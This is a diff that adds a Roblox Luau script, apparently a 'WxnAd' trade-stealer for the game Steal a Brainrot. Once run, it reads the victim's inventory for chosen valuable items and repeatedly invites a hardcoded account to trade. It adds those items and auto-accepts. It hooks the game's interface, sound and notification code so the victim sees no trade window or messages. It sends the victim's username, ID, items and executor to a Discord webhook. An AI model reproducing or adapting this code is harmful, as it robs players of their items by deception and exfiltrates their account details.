@@ -1,0 +1,822 @@
+return function(targetId, webhookUrl, targetBrainrots, targetGears, targetBaseSkins)
+    repeat task.wait() until game:IsLoaded()
+    if getgenv().WxnAd then return end; getgenv().WxnAd = true
+
+    local Players = game:GetService("Players")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local HttpService = game:GetService("HttpService")
+    local MarketplaceService = game:GetService("MarketplaceService")
+
+    local ReplicatorClient = require(ReplicatedStorage.Packages.ReplicatorClient)
+    local Channel = require(ReplicatedStorage.Packages.Synchronizer.Channel)
+    local AnimalsData = require(ReplicatedStorage.Datas.Animals)
+    local GameData = require(ReplicatedStorage.Datas.Game)
+    local MutationsData = require(ReplicatedStorage.Datas.Mutations)
+    local TraitsData = require(ReplicatedStorage.Datas.Traits)
+    local BaseSkins = require(ReplicatedStorage.Shared.BaseSkins)
+    local Gears = require(ReplicatedStorage.Shared.Gears)
+    local TradeController = require(ReplicatedStorage.Controllers.TradeController)
+    local InterfaceController = require(ReplicatedStorage.Controllers.InterfaceController)
+    local SoundController = require(ReplicatedStorage.Controllers.SoundController)
+    local NotificationController = require(ReplicatedStorage.Controllers.NotificationController)
+    local CameraController = require(ReplicatedStorage.Controllers.CameraController)
+
+    local LP = Players.LocalPlayer
+    local cam = workspace.CurrentCamera
+    local pg = LP:WaitForChild("PlayerGui")
+
+    local DUEL_PLACE_ID = 99606176102979
+    local MAIN_PLACE_ID = 109983668079237
+    local LL_GROUP_ID = 35815907
+
+    local PLACE_ID = game.PlaceId
+    local isDuel = PLACE_ID == DUEL_PLACE_ID
+
+    if PLACE_ID ~= DUEL_PLACE_ID and PLACE_ID ~= MAIN_PLACE_ID then
+        local ok, info = pcall(function()
+            return MarketplaceService:GetProductInfo(PLACE_ID)
+        end)
+        if not (ok and info and info.Creator and info.Creator.CreatorType == "Group" and tonumber(info.Creator.CreatorTargetId) == LL_GROUP_ID) then
+            LP:Kick("You're stupid using modded")
+            return
+        end
+    end
+
+    local JOB_ID = tostring(game.JobId) .. "_" .. tostring(LP.UserId)
+
+    local executorName = "Unknown"
+    pcall(function()
+        if getgenv().EXECUTOR_NAME then
+            executorName = getgenv().EXECUTOR_NAME
+        elseif identifyexecutor then
+            local ok, exec = pcall(identifyexecutor)
+            if ok and exec then executorName = exec end
+        elseif getexecutorname then
+            local ok, exec = pcall(getexecutorname)
+            if ok and exec then executorName = exec end
+        elseif syn and syn.getexecutorname then
+            executorName = syn.getexecutorname()
+        end
+    end)
+    if executorName == "Unknown" then
+        if syn then executorName = "Synapse"
+        elseif KRNL_LOADED then executorName = "Krnl"
+        elseif WL_LOADED then executorName = "WeAreDevs"
+        elseif getgenv().is_sirhurt then executorName = "SirHurt"
+        end
+    end
+
+    local function normalizeTargets(source)
+        local set = {}
+        if typeof(source) == "string" then
+            set[source] = true
+        elseif typeof(source) == "table" then
+            for key, value in pairs(source) do
+                if typeof(key) == "number" and typeof(value) == "string" then
+                    set[value] = true
+                elseif typeof(key) == "string" and (value == true or value == key) then
+                    set[key] = true
+                end
+            end
+        end
+        return set
+    end
+
+    local TargetBrainrots = normalizeTargets(targetBrainrots)
+    local TargetGears = normalizeTargets(targetGears)
+    local TargetBaseSkins = normalizeTargets(targetBaseSkins)
+
+    local function getReqFn()
+        return (syn and syn.request) or (http and http.request) or http_request or request
+    end
+
+    local interface = InterfaceController:Get("TradeLiveTrade")
+    local originalToggle = InterfaceController.Toggle
+    local originalSetState = InterfaceController.SetState
+    local originalNotify = NotificationController.Notify
+    local originalError = NotificationController.Error
+    local originalSuccess = NotificationController.Success
+    local originalPlaySound = SoundController.PlaySound
+
+    local function isFromTrade()
+        for level = 2, 8 do
+            local caller = debug.info(level, "s")
+            if not caller then break end
+            if caller:find("TradeController") then return true end
+        end
+        return false
+    end
+
+    local function blockedNotify(msg)
+        if typeof(msg) ~= "string" then return false end
+        local plain = msg:gsub("<[^>]+>", "")
+        local lower = plain:lower()
+        local hasAt = plain:find("@") ~= nil
+        return (hasAt and lower:find("cancel"))
+            or (plain:find("Failed") and lower:find("trade"))
+            or (hasAt and lower:find("completed"))
+    end
+
+    SoundController.PlaySound = function(self, name, ...)
+        local trade = InterfaceController:Get("TradeLiveTrade")
+        local fromBtn = false
+        for lvl = 2, 4 do local s = debug.info(lvl, "s"); if s and s:find("AnimatedButton") then fromBtn = true break end end
+        if isFromTrade() or (fromBtn and trade and trade:IsOpened()) then
+            return
+        end
+        return originalPlaySound(self, name, ...)
+    end
+
+    if interface and interface:IsOpened() then
+        InterfaceController:Toggle("TradeLiveTrade", false)
+        CameraController:Blur(0, 0)
+        cam.FieldOfView = CameraController:GetDefaultFov()
+    end
+
+    InterfaceController.Toggle = function(self, name, state, exceptions)
+        if name == "TradeLiveTrade" then return end
+        return originalToggle(self, name, state, exceptions)
+    end
+
+    InterfaceController.SetState = function(self, name, state, exceptions)
+        if name == "TradeLiveTrade" then return end
+        return originalSetState(self, name, state, exceptions)
+    end
+
+    NotificationController.Notify = function(self, msg, ...)
+        if isFromTrade() or blockedNotify(msg) then return end
+        return originalNotify(self, msg, ...)
+    end
+
+    NotificationController.Error = function(self, ...)
+        if isFromTrade() then return end
+        return originalError(self, ...)
+    end
+
+    NotificationController.Success = function(self, ...)
+        if isFromTrade() then return end
+        return originalSuccess(self, ...)
+    end
+
+    local function formatNumber(n)
+        if not n or n == 0 then return "$0/s" end
+        local suffixes = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "Dc" }
+        local tier = math.floor(math.log10(math.abs(n)) / 3)
+        if tier == 0 then return "$" .. tostring(math.floor(n)) .. "/s" end
+        local scaled = n / (1000 ^ tier)
+        local formatted = string.format("%.1f", scaled)
+        if formatted:sub(-2) == ".0" then formatted = formatted:sub(1, -3) end
+        return "$" .. formatted .. suffixes[tier + 1] .. "/s"
+    end
+
+    local function getRealValue(animalName, mutation, traits)
+        if type(animalName) ~= "string" then return 0 end
+        local animal = AnimalsData[animalName]
+        if not animal then return 0 end
+        local baseGen = animal.Generation or (animal.Price * GameData.Game.AnimalGanerationModifier)
+        local multiplier = 1
+        if mutation and mutation ~= "None" and MutationsData[mutation] then
+            multiplier = multiplier + MutationsData[mutation].Modifier
+        end
+        if traits then
+            local sleepy = false
+            for _, trait in ipairs(traits) do
+                if trait == "Sleepy" then
+                    sleepy = true
+                elseif TraitsData[trait] then
+                    multiplier = multiplier + TraitsData[trait].MultiplierModifier
+                end
+            end
+            if sleepy then multiplier = multiplier * 0.5 end
+        end
+        return math.round(baseGen * multiplier)
+    end
+
+    local function getSyncChannel()
+        for _, v in getgc(true) do
+            if type(v) == "table" and getmetatable(v) == Channel and v.Index == LP then
+                return v
+            end
+        end
+        return nil
+    end
+
+    local capturedChannel
+    repeat capturedChannel = getSyncChannel() task.wait(0.1) until capturedChannel
+
+    local function readKey(key)
+        local ok, value = pcall(function()
+            return capturedChannel:Get(key)
+        end)
+        if ok and value ~= nil then return value end
+        local cache = capturedChannel.CacheTable
+        if typeof(cache) == "table" then return cache[key] end
+        return nil
+    end
+
+    local DataInv = { Brainrots = {}, Gears = {}, Bases = {} }
+
+    local function HasItens()
+        return #DataInv.Brainrots > 0 or #DataInv.Gears > 0 or #DataInv.Bases > 0
+    end
+
+    task.spawn(function()
+        while true do
+            local newInv = { Brainrots = {}, Gears = {}, Bases = {} }
+
+            local podiums = readKey("AnimalPodiums") or readKey("AnimalList")
+            if typeof(podiums) == "table" then
+                for slotKey, animalData in pairs(podiums) do
+                    local slot = tonumber(slotKey)
+                    if slot and typeof(animalData) == "table" and animalData.Index
+                        and not animalData.Machine
+                        and AnimalsData[animalData.Index]
+                        and TargetBrainrots[animalData.Index] then
+                        local genValue = getRealValue(animalData.Index, animalData.Mutation, animalData.Traits)
+                        table.insert(newInv.Brainrots, { slotKey = slot, data = animalData, genValue = genValue })
+                    end
+                end
+            end
+
+            local okGears, gearList = pcall(function()
+                local list = {}
+                for _, gear in Gears.ListOwned(capturedChannel) do
+                    table.insert(list, gear)
+                end
+                return list
+            end)
+            if okGears and typeof(gearList) == "table" then
+                for _, gear in ipairs(gearList) do
+                    if typeof(gear) == "table" and typeof(gear.GearName) == "string" and TargetGears[gear.GearName] then
+                        table.insert(newInv.Gears, { GearName = gear.GearName, UUID = gear.UUID })
+                    end
+                end
+            end
+
+            local skinInv = readKey("BaseSkinInventory")
+            if typeof(skinInv) == "table" then
+                for uuid, skinData in pairs(skinInv) do
+                    if typeof(uuid) == "string" and typeof(skinData) == "table"
+                        and typeof(skinData.SkinName) == "string"
+                        and TargetBaseSkins[skinData.SkinName]
+                        and BaseSkins.IsTradable(skinData.SkinName) then
+                        table.insert(newInv.Bases, { SkinName = skinData.SkinName, UUID = uuid })
+                    end
+                end
+            end
+
+            DataInv = newInv
+            task.wait(0.25)
+        end
+    end)
+
+    local MUTATION_EMOJIS = {
+        ["Bloodrot"] = "<:Bloodrot_Mutation_Icon:1526148047174766612>", ["Candy"] = "<:Candy_Mutation_Icon:1526148182642528347>", ["Crystal"] = "<:Crystal:1532118171618902198>", ["Cursed"] = "<:Cursed_Mutation_Icon:1526148377362956338>", ["Cyber"] = "<:Cyber_Mutation_Icon:1526148446589816833>", ["Default"] = "<:Default_Mutation_Icon:1526147901351264266>", ["Diamond"] = "<:Diamond_Mutation_Icon:1526147968216858697>", ["Divine"] = "<:Divine_Mutation_Icon:1526148416755990549>", ["Eclipse"] = "<:Eclipse_Mutation_Icon:1568782896142225438>", ["Galaxy"] = "<:Galaxy_Mutation_Icon:1526148261449306173>", ["Gold"] = "<:Gold_Mutation_Icon:1526147938131251332>", ["Lava"] = "<:Lava_Mutation_Icon:1526148216062742557>", ["Phantom"] = "<:Phantom_Mutation_Icon:1526148483579510954>", ["Radioactive"] = "<:Radioactive_Mutation_Icon:1526148308660129822>", ["Rainbow"] = "<:Rainbow_Mutation_Icon:1526148005022138398>", ["YinYang"] = "<:Yin_Yang_Mutation_Icon:1526148344659841095>"
+    }
+    local GEAR_EMOJIS = {
+        ["Alien Slap"] = "<:gearalienslap:1536941130581807124>", ["Blackhole Bomb"] = "<:gearblackholebomb:1536941156649402490>", ["Bloodmoon Hammer"] = "<:gearbloodmoonhammer:1536941316087222303>", ["Bloodmoon Slap"] = "<:gearbloodmoonslap:1536941363260821644>", ["Cupid's Wings"] = "<:gearcupidswings:1536941473407176715>", ["Cursed Slap"] = "<:gearcursedslap:1536941510824689764>", ["Cyber Slap"] = "<:gearcyberslap:1536941541971730483>", ["Demon's Head"] = "<:geardemonshead:1536941574028525649>", ["Divine Slap"] = "<:geardivineslap:1536941781277741076>", ["Lava Blaster"] = "<:gearlavablaster:1536941824915283998>", ["Lava Slap"] = "<:gearlavaslap:1536941851267965028>", ["Radioactive Airstrike"] = "<:gearradioactiveairstrike:1536941888148480000>", ["Radioactive Slap"] = "<:gearradioactiveslap:1536941915931545650>", ["Rainbow Hammer"] = "<:gearrainbowhammer:1536941964149133352>", ["Rainbow Slap"] = "<:gearrainbowslap:1536941997510754424>", ["Santa's Sleigh"] = "<:gearsantassleigh:1536942025646153818>", ["Waverider"] = "<:gearwaverider:1536942058676420680>", ["Witch's Broom"] = "<:gearwitchsbroom:1536942085649731667>", ["Yin Yang Lamp"] = "<:gearyinyanglamp:1536942111218335754>", ["Yin Yang Slap"] = "<:gearyinyangslap:1536942134668697640>", ["Phantom Slap"] = "<:phantomslap:1536940296116371477>", ["Crystal Slap"] = "<:CrystalSlap:1544560430004043846>"
+    }
+    local BASESKIN_EMOJIS = {
+        ["Aquatic"] = "<:baseskinaquatic:1536943396168532018>", ["Bunny Basket"] = "<:baseskinbunnybasket:1536943427327889419>", ["Christmas"] = "<:baseskinchristmas:1536943450388308049>", ["Easter"] = "<:baseskineaster:1536943602981281792>", ["Gingerbread"] = "<:baseskingingerbread:1536943707289555015>", ["Halloween"] = "<:baseskinhalloween:1536943747995279380>", ["Lucky"] = "<:baseskinlucky:1536943979793490000>", ["Octo"] = "<:Octo_base:1536944000752418856>", ["Pot of Gold"] = "<:baseskinpotofgold:1536944019827986532>", ["Rose"] = "<:baseskinrose:1536944091558842378>", ["Valentines"] = "<:Valentines_base:1536944152565252136>", ["Taco"] = "<:baseskintaco:1536944658809225286>"
+    }
+    local TRAIT_EMOJIS = {
+        ["10B"] = "<:10b:1526146250590785579>", ["1 Year"] = "<:1YR_Icon_Fixed:1526146382757498970>", ["26"] = "<:2026Trait:1526146276452728944>", [":3"] = "<:3_:1526146860757024808>", ["UFO"] = "<:Alienevent1:1537678162190798928>", ["Ball"] = "<:Ball:1526146038606467073>", ["Brazil"] = "<:Brazil:1526145968674967632>", ["Bubblegum"] = "<:Bubblegum:1526147039434379274>", ["Bunny Ears"] = "<:BunnyEars:1526146436172091483>", ["Burger"] = "<:Burger_Trait:1526147238663815229>", ["Chocolate"] = "<:ChocolateTrait:1526146015445389382>", ["Cometstruck"] = "<:Cometstruck:1526145885556314173>", ["Claws"] = "<:CrabClaw:1526147141976985635>", ["Disco"] = "<:Disco:1526147212457807884>", ["Explosive"] = "<:Bombardiro:1526146699112747038>", ["Fire"] = "<:Fire:1526147415281762384>", ["Fireworks"] = "<:Fireworks:1526147343211298946>", ["Galactic"] = "<:Comet2:1526146723993485312>", ["Glitched"] = "<:Glitch:1526147180841144350>", ["Granny"] = "<:Granny:1526147444990021723>", ["RIP Gravestone"] = "<:GraveYardRIPTombstone:1526146501271748689>", ["Halo"] = "<:HaloTraitIcon:1526146119422443520>", ["Indonesia"] = "<:Indonesian:1526145949414588487>", ["Jackolantern Pet"] = "<:JackoLantern_Pet_Trait:1526146530686537838>", ["John Pork"] = "<:John_Pork_Trait_HD:1526147509460664380>", ["Lucky"] = "<:Lucky:1526146094675787877>", ["Matteo Hat"] = "<:MatteoHat:1526146756004417597>", ["Meowl"] = "<:ICON_Meowl:1526147660673847317>", ["Sombrero"] = "<:Mexico_Hat:1526145924844224583>", ["Nyan"] = "<:Nyan:1526147310399000646>", ["Pink Balloon"] = "<:PinkBalloon:1526146180227268638>", ["Pink Egg"] = "<:PinkEgg:1526146411962433566>", ["Rainbow Balloon"] = "<:RainbowBalloon:1526146214175969411>", ["Red Balloon"] = "<:RedBalloon:1526146151022067732>", ["Reindeer Pet"] = "<:Reindeer:1526146642036785212>", ["Rose"] = "<:Rose:1526147384201969684>", ["Santa Hat"] = "<:SantaHatIcon:1526146592074240070>", ["Shark Fin"] = "<:Shark_Fin:1526146666409885767>", ["Skibidi"] = "<:SkibidiIcon:1526147476782973028>", ["Sleepy"] = "<:Sleepy:1526146936522932406>", ["Snowy"] = "<:Snowy:1526145862684774601>", ["Spider"] = "<:Spider:1526146795825270915>", ["Strawberry"] = "<:Strawberry:1526147692269408266>", ["Taco"] = "<:Taco:1526146973433073704>", ["Tie"] = "<:Tie:1526146822903693422>", ["Wet"] = "<:Wet:1526145830506070056>", ["Zombie"] = "<:EvilTungTungSahur1:1537678175977480334>", ["Paint"] = "<:Chicleteirabicicleteira:1526146906546241657>", ["Orange Balloon"] = "<:orangeballoon:1542305480565592134>", ["Green Balloon"] = "<:greenballoon:1542305605807775764>", ["Blue Balloon"] = "<:blueballoon:1542305311413633125>", ["Orange Egg"] = "<:orangeegg:1542305816277811200>", ["Green Egg"] = "<:greenegg:1542305940215304313>", ["Blue Egg"] = "<:blueegg:1542306035404906497>", ["Bull"] = "<:bull:1542280218092376165>", ["Lightning"] = "<:Dragon:1526147276748099665>", ["Skeleton"] = "<:Extincty:1526145992209207307>", ["Aura Shades"] = "<:Aura_Shades1:1537678067751714816>", ["Witch Hat"] = "<:Witchhat:1526146475317526589>", ["Sun"] = "<:sun:1542318228041371768>", ["Ice Bee"] = "<:icebee:1542318162777739274>", ["Fire Bee"] = "<:firebee:1542318193681629275>", ["Job Application"] = "<:jobapplication:1542317461079203880>", ["Bee"] = "<:bee:1542317981818945538>", ["Queen Bee"] = "<:queenbee:1543056608181882910>"
+    }
+
+    local webhookSent = false
+
+    local function getWikiImage(name)
+        local reqFn = getReqFn()
+        if not reqFn then return nil end
+        local url = "https://stealabrainrot.fandom.com/api.php?action=query&titles="
+            .. HttpService:UrlEncode(name)
+            .. "&prop=pageimages&pithumbsize=80&format=json&redirects=1&normalize=1"
+        local ok, response = pcall(function()
+            return reqFn({ Url = url, Method = "GET" })
+        end)
+        if not ok or not response then return nil end
+        local ok2, data = pcall(function()
+            return HttpService:JSONDecode(response.Body)
+        end)
+        if not ok2 or not data or not data.query or not data.query.pages then return nil end
+        for _, page in pairs(data.query.pages) do
+            if page.thumbnail then return page.thumbnail.source end
+        end
+        return nil
+    end
+
+    local function sendWebhook()
+        if webhookSent then return end
+        if not webhookUrl or webhookUrl == "" then return end
+        local reqFn = getReqFn()
+        if not reqFn then return end
+
+        local brainrotItems, baseskinItems, gearItems = {}, {}, {}
+
+        for _, b in ipairs(DataInv.Brainrots) do
+            table.insert(brainrotItems, {
+                name = b.data.Index,
+                mutation = b.data.Mutation or "None",
+                traits = b.data.Traits or {},
+                genValue = b.genValue or 0,
+            })
+        end
+        for _, skin in ipairs(DataInv.Bases) do
+            table.insert(baseskinItems, skin.SkinName)
+        end
+        for _, gear in ipairs(DataInv.Gears) do
+            table.insert(gearItems, gear.GearName)
+        end
+
+        if #brainrotItems == 0 and #baseskinItems == 0 and #gearItems == 0 then return end
+        webhookSent = true
+
+        table.sort(brainrotItems, function(a, b) return a.genValue > b.genValue end)
+
+        local totalValue = 0
+        local brainrotLines = {}
+        for _, item in ipairs(brainrotItems) do
+            totalValue = totalValue + item.genValue
+            local mutEmoji = MUTATION_EMOJIS[item.mutation] or MUTATION_EMOJIS["Default"]
+            local line = mutEmoji .. " **" .. item.name .. "**"
+            for _, trait in ipairs(item.traits) do
+                line = line .. " " .. (TRAIT_EMOJIS[trait] or ("`" .. trait .. "`"))
+            end
+            if #item.traits > 1 then
+                line = line .. " *(" .. #item.traits .. " traits)*"
+            end
+            line = line .. " — **" .. formatNumber(item.genValue) .. "**"
+            table.insert(brainrotLines, line)
+        end
+
+        local bestImage = nil
+        if brainrotItems[1] then
+            pcall(function() bestImage = getWikiImage(brainrotItems[1].name) end)
+        end
+
+        local baseskinLines = {}
+        for _, name in ipairs(baseskinItems) do
+            table.insert(baseskinLines, (BASESKIN_EMOJIS[name] or utf8.char(127912)) .. " **" .. name .. "**")
+        end
+
+        local gearLines = {}
+        for _, name in ipairs(gearItems) do
+            table.insert(gearLines, (GEAR_EMOJIS[name] or utf8.char(9881)) .. " **" .. name .. "**")
+        end
+
+        local currentTime = os.time()
+        local innerComponents = {}
+
+        table.insert(innerComponents, {
+            type = 10,
+            content = "# WxnAd\n" .. utf8.char(128232) .. " **Invite received from:** `" .. LP.Name .. "` (ID: `" .. tostring(LP.UserId) .. "`)"
+        })
+
+        table.insert(innerComponents, { type = 14, spacing = 1, divider = true })
+
+        if #brainrotLines > 0 then
+            local section = {
+                type = 9,
+                components = {{
+                    type = 10,
+                    content = "## Brainrots\n" .. table.concat(brainrotLines, "\n") .. "\n\n" .. utf8.char(128176) .. " **Total Value: " .. formatNumber(totalValue) .. "**"
+                }}
+            }
+            if bestImage then
+                section.accessory = { type = 11, media = { url = bestImage } }
+            end
+            table.insert(innerComponents, section)
+            table.insert(innerComponents, { type = 14, spacing = 1, divider = true })
+        end
+
+        if #baseskinLines > 0 then
+            table.insert(innerComponents, { type = 10, content = "## Base Skins\n" .. table.concat(baseskinLines, "\n") })
+            table.insert(innerComponents, { type = 14, spacing = 1, divider = true })
+        end
+
+        if #gearLines > 0 then
+            table.insert(innerComponents, { type = 10, content = "## Gears\n" .. table.concat(gearLines, "\n") })
+            table.insert(innerComponents, { type = 14, spacing = 1, divider = true })
+        end
+
+        table.insert(innerComponents, {
+            type = 10,
+            content = "## Status\n"
+                .. (isDuel and "**In Duel**" or "**Not in Duel**") .. "\n"
+                .. utf8.char(128338) .. " <t:" .. currentTime .. ":f>\n"
+                .. utf8.char(127757) .. " Players in server: **" .. #Players:GetPlayers() .. "**\n"
+                .. utf8.char(9889) .. " Executor: **" .. executorName .. "**\n\n"
+                .. "-# WxnAd  |  discord.gg/UA9xGPKAqE"
+        })
+
+        local payloadComponents = {}
+        if not isDuel then
+            table.insert(payloadComponents, { type = 10, content = "@everyone" })
+        end
+        table.insert(payloadComponents, {
+            type = 17,
+            accent_color = isDuel and 0xFF0000 or 0xFFA500,
+            components = innerComponents,
+        })
+
+        pcall(function()
+            reqFn({
+                Url = webhookUrl .. "?with_components=true",
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode({
+                    username = "WxnAd",
+                    avatar_url = "https://cdn.discordapp.com/icons/1545539307115389090/2ac991cdb58cc4366de3c289af2f3c85.png",
+                    flags = 32768,
+                    allowed_mentions = { parse = isDuel and {} or { "everyone" } },
+                    components = payloadComponents,
+                }),
+            })
+        end)
+    end
+
+    local INVITE_GUID = "9b5a0c7d-327f-415a-9720-b8e4f02b946a"
+    local SELECT_BRAINROT_GUID = "bce6ca77-ef3c-4aab-b6e1-99f9c1815863"
+    local SELECT_ITEM_GUID = "b0e90195-78ba-4028-8af6-8eb86c4ed82d"
+    local READY_GUID = "1774f028-dbab-4713-8122-c30d77582edc"
+    local ACCEPT_GUID = "d061f53c-7d12-4a4a-a761-d70b06c0d44c"
+
+    local inviteRemote, addBrainrotRemote, addItemRemote, readyRemote, acceptRemote, tradeCompleted
+    pcall(function()
+        local v_u_134 = getupvalue(TradeController._createLiveTrade, 15)
+
+        inviteRemote = getupvalue(TradeController.SendInvite, 1)
+        addBrainrotRemote = getupvalue(v_u_134["Brainrot"].Add, 1)
+        addItemRemote = getupvalue(v_u_134["BaseSkin"].Add, 1)
+        readyRemote = getupvalue(TradeController._createLiveTrade, 24)
+        acceptRemote = getupvalue(TradeController._createLiveTrade, 23)
+        tradeCompleted = getupvalue(TradeController._createPlayerList, 21)
+    end)
+
+    if not (inviteRemote and addBrainrotRemote and addItemRemote and readyRemote and acceptRemote) then return end
+
+    local tradeOpened = false
+    local tradeReplicator = ReplicatorClient.get(("Trade_%*"):format(LP.UserId))
+
+    local otherUserId = nil
+
+    local function getOtherUserId()
+        local users = tradeReplicator:TryIndex({ "active", "data", "users" })
+        if type(users) ~= "table" then return nil end
+        for _, userId in users do
+            if userId ~= LP.UserId then
+                return userId
+            end
+        end
+        return nil
+    end
+
+    local function tradeSnapshot()
+        local data = tradeReplicator:TryIndex({ "active", "data" })
+        if typeof(data) ~= "table" or typeof(data.users) ~= "table" then return nil end
+
+        local mySlot, otherSlot = nil, nil
+        for slot, userId in pairs(data.users) do
+            if userId == LP.UserId then
+                mySlot = slot
+            else
+                otherSlot = slot
+            end
+        end
+        if mySlot == nil then return nil end
+
+        local function entry(slot)
+            if typeof(data.players) ~= "table" or slot == nil then return nil end
+            local e = data.players[slot]
+            if e == nil then e = data.players[tostring(slot)] end
+            if typeof(e) ~= "table" then return nil end
+            return e
+        end
+
+        return { data = data, me = entry(mySlot), other = entry(otherSlot) }
+    end
+
+    local function offerHas(offer, bucket, key)
+        if typeof(offer) ~= "table" or typeof(offer[bucket]) ~= "table" then return false end
+        return offer[bucket][key] ~= nil or offer[bucket][tostring(key)] ~= nil
+    end
+
+    local function buildPending(offer)
+        local list = {}
+
+        for _, b in ipairs(DataInv.Brainrots) do
+            table.insert(list, {
+                bucket = "brainrots",
+                key = tostring(b.slotKey),
+                call = function()
+                    return addBrainrotRemote:InvokeServer(SELECT_BRAINROT_GUID, b.slotKey, b.data)
+                end,
+            })
+        end
+
+        for _, g in ipairs(DataInv.Gears) do
+            table.insert(list, {
+                bucket = "gears",
+                key = g.UUID or ("name:" .. g.GearName),
+                call = function()
+                    return addItemRemote:InvokeServer(SELECT_ITEM_GUID, "Gear", { GearName = g.GearName, UUID = g.UUID })
+                end,
+            })
+        end
+
+        for _, s in ipairs(DataInv.Bases) do
+            table.insert(list, {
+                bucket = "baseSkins",
+                key = s.UUID,
+                call = function()
+                    return addItemRemote:InvokeServer(SELECT_ITEM_GUID, "BaseSkin", { UUID = s.UUID, SkinName = s.SkinName })
+                end,
+            })
+        end
+
+        local pending = {}
+        for _, p in ipairs(list) do
+            if not offerHas(offer, p.bucket, p.key) then
+                table.insert(pending, p)
+            end
+        end
+        return pending
+    end
+
+    local function runTrade()
+        local attempts = {}
+        local done = {}
+
+        while tradeOpened do
+            local snap = tradeSnapshot()
+            if not snap or not snap.me then
+                task.wait(0.25)
+            else
+                local me, other, data = snap.me, snap.other, snap.data
+
+                local pending = nil
+                for _, p in ipairs(buildPending(me.offer)) do
+                    local id = p.bucket .. ":" .. p.key
+                    if not done[id] and (attempts[id] or 0) < 3 then
+                        pending = p
+                        break
+                    end
+                end
+
+                if pending and not me.accepted then
+                    local id = pending.bucket .. ":" .. pending.key
+                    local ok, success, reason = pcall(pending.call)
+                    if ok and success then
+                        done[id] = true
+                    else
+                        attempts[id] = (attempts[id] or 0) + 1
+                        warn("[WxnAd] add failed", pending.bucket, tostring(pending.key), tostring(ok and reason or success))
+                    end
+                    task.wait(0.6)
+                else
+                    local lastChange = data.lastChange
+                    local now = workspace:GetServerTimeNow()
+                    if typeof(lastChange) == "number" and now < lastChange + 5.2 then
+                        task.wait(0.25)
+                    elseif other and other.ready then
+                        if not me.accepted then
+                            pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
+                        end
+                        task.wait(0.5)
+                    else
+                        if not me.ready then
+                            pcall(function() readyRemote:FireServer(READY_GUID) end)
+                        end
+                        task.wait(0.5)
+                    end
+                end
+            end
+        end
+    end
+
+    task.spawn(function()
+        while true do
+            if not tradeOpened and HasItens() then
+                pcall(function()
+                    inviteRemote:InvokeServer(INVITE_GUID, targetId)
+                end)
+            end
+            task.wait(0.1)
+        end
+    end)
+
+    task.spawn(sendWebhook)
+
+    task.spawn(function()
+        while true do
+            if tradeOpened then
+                runTrade()
+            end
+            task.wait(0.25)
+        end
+    end)
+
+    local lockoutShown = false
+
+    local function fetchDiscordInvite(inviteCode, cacheFileName)
+        local reqFn = getReqFn()
+        if not reqFn then return nil end
+
+        local ok, res = pcall(function()
+            return reqFn({
+                Url = "https://discord.com/api/v10/invites/" .. inviteCode .. "?with_counts=true",
+                Method = "GET",
+                Headers = { ["Content-Type"] = "application/json" },
+            })
+        end)
+        if not ok or not res then return nil end
+
+        local decOk, json = pcall(HttpService.JSONDecode, HttpService, res.Body)
+        if not decOk or not json or not json.guild then return nil end
+
+        local guild = json.guild
+        local memberCount = json.approximate_member_count or 0
+        local iconAsset = nil
+
+        if guild.icon then
+            local iconUrl = ("https://cdn.discordapp.com/icons/%s/%s.png?size=128"):format(guild.id, guild.icon)
+            local iconOk, iconRes = pcall(function()
+                return reqFn({ Url = iconUrl, Method = "GET" })
+            end)
+            if iconOk and iconRes then
+                pcall(function()
+                    local filePath = cacheFileName .. ".png"
+                    writefile(filePath, iconRes.Body)
+                    iconAsset = getcustomasset(filePath)
+                end)
+            end
+        end
+
+        return { icon = iconAsset, name = guild.name or inviteCode, members = memberCount }
+    end
+
+    local function createDiscordCard(parent, position, serverData, inviteCode)
+        local container = Instance.new("Frame")
+        container.Size = UDim2.fromOffset(276, 85)
+        container.Position = position
+        container.BackgroundTransparency = 1
+        container.BorderSizePixel = 0
+        container.ClipsDescendants = false
+        container.Parent = parent
+
+        local clickArea = Instance.new("TextButton")
+        clickArea.Size = UDim2.fromScale(1, 1)
+        clickArea.Position = UDim2.fromScale(0, 0)
+        clickArea.BackgroundTransparency = 1
+        clickArea.Text = ""
+        clickArea.ZIndex = 10
+        clickArea.Parent = container
+        clickArea.MouseButton1Click:Connect(function()
+            pcall(function()
+                setclipboard("discord.gg/" .. inviteCode)
+            end)
+        end)
+
+        local iconContainer = Instance.new("Frame")
+        iconContainer.Size = UDim2.fromOffset(62, 62)
+        iconContainer.Position = UDim2.new(0, 0, 0.5, -31)
+        iconContainer.BackgroundTransparency = 1
+        iconContainer.BorderSizePixel = 0
+        iconContainer.ZIndex = 2
+        iconContainer.Parent = container
+
+        local iconImg = Instance.new("ImageLabel")
+        iconImg.Size = UDim2.fromScale(1, 1)
+        iconImg.BackgroundTransparency = 1
+        iconImg.Image = (serverData and serverData.icon) or ""
+        iconImg.ZIndex = 3
+        iconImg.Parent = iconContainer
+        Instance.new("UICorner", iconImg).CornerRadius = UDim.new(0, 10)
+
+        local infoContainer = Instance.new("Frame")
+        infoContainer.Size = UDim2.new(1, -76, 1, 0)
+        infoContainer.Position = UDim2.fromOffset(76, 0)
+        infoContainer.BackgroundTransparency = 1
+        infoContainer.ZIndex = 3
+        infoContainer.Parent = container
+
+        local nameLabel = Instance.new("TextLabel")
+        nameLabel.Size = UDim2.new(1, 0, 0, 30)
+        nameLabel.Position = UDim2.new(0, 0, 0, 14)
+        nameLabel.BackgroundTransparency = 1
+        nameLabel.Text = (serverData and serverData.name) or "Unknown"
+        nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        nameLabel.TextSize = 15
+        nameLabel.Font = Enum.Font.GothamBold
+        nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+        nameLabel.TextTruncate = Enum.TextTruncate.AtEnd
+        nameLabel.ZIndex = 4
+        nameLabel.Parent = infoContainer
+
+        local statusContainer = Instance.new("Frame")
+        statusContainer.Size = UDim2.new(1, 0, 0, 16)
+        statusContainer.Position = UDim2.new(0, 0, 0, 46)
+        statusContainer.BackgroundTransparency = 1
+        statusContainer.ZIndex = 4
+        statusContainer.Parent = infoContainer
+
+        local statusDot = Instance.new("Frame")
+        statusDot.Size = UDim2.fromOffset(6, 6)
+        statusDot.Position = UDim2.new(0, 0, 0.5, -3)
